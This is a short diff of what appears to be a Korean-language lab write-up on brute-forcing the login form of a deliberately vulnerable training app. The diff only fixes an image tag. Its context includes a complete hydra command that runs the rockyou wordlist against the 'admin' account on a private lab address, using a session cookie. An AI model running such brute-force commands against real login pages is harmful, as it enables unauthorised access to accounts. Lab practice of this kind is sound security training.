@@ -11,7 +11,7 @@
 
 이를 이용해서 hydra를 사용해서 비밀번호를 찾아볼 생각이다.
 
-<img src=https://github.com/user-attachments/assets/fbfb341c-6c73-4582-8e17-1693c05f1edd width 500>
+<img src=https://github.com/user-attachments/assets/fbfb341c-6c73-4582-8e17-1693c05f1edd width=500>
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.110 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=j0hhk5h9tv98ldtfn6aajf83h6; security=low:F=Username and/or password incorrect."
 
